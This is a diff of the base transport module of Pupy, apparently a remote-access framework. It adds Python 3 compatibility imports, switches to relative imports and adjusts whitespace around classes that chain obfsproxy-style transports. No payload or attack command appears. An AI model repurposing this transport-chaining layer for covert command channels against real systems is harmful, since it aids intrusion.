@@ -2,11 +2,18 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
+
 class ReleaseChainedTransport(Exception):
     __slots__ = ()
 
+
 class TransportSetupFailed(Exception):
     __slots__ = ()
+
 
 class BasePupyTransport(object):
     __slots__ = (
@@ -33,12 +40,14 @@ class BasePupyTransport(object):
     @classmethod
     def customize(cls, **kwargs):
         """ return a class with some existing attributes customized """
+
         for name, value in kwargs.iteritems():
             if name in ["cookie", "upstream", "downstream", "stream"]:
                 raise TransportError("you cannot customize the protected attribute %s"%name)
             if not hasattr(cls, name):
                 raise TransportError("Transport has no attribute %s"%name)
-        NewSubClass = type('Customized_{}'.format(cls.__name__), (cls,), kwargs)
+
+        NewSubClass = type(str('Customized_{}'.format(cls.__name__)), (cls,), kwargs)
         return NewSubClass
 
     @classmethod
@@ -98,21 +107,26 @@ class BasePupyTransport(object):
             """ obfsproxy style alias """
         raise NotImplementedError()
 
+
 class BaseTransport(BasePupyTransport):
     """ obfsproxy style alias """
     __slots__ = ()
 
+
 class TransportError(Exception):
     __slots__ = ()
+
 
 class PluggableTransportError(Exception):
     __slots__ = ()
 
-from buffer import Buffer
-from streams.PupySocketStream import addGetPeer
+
+from .buffer import Buffer
+from .streams.PupySocketStream import addGetPeer
 
 from network.lib import getLogger
 logger = getLogger('chain')
+
 
 class TransportWrapper(BasePupyTransport):
 
@@ -206,6 +220,7 @@ class TransportWrapper(BasePupyTransport):
             data.write_to(self.downstream)
         else:
             self.chain[idx].upstream_recv(data)
+
 
 def chain_transports(*args):
     """ chain 2 or more transports in such a way that the first argument is the transport seen at network level like t1(t2(t3(...(raw_data)...)))"""
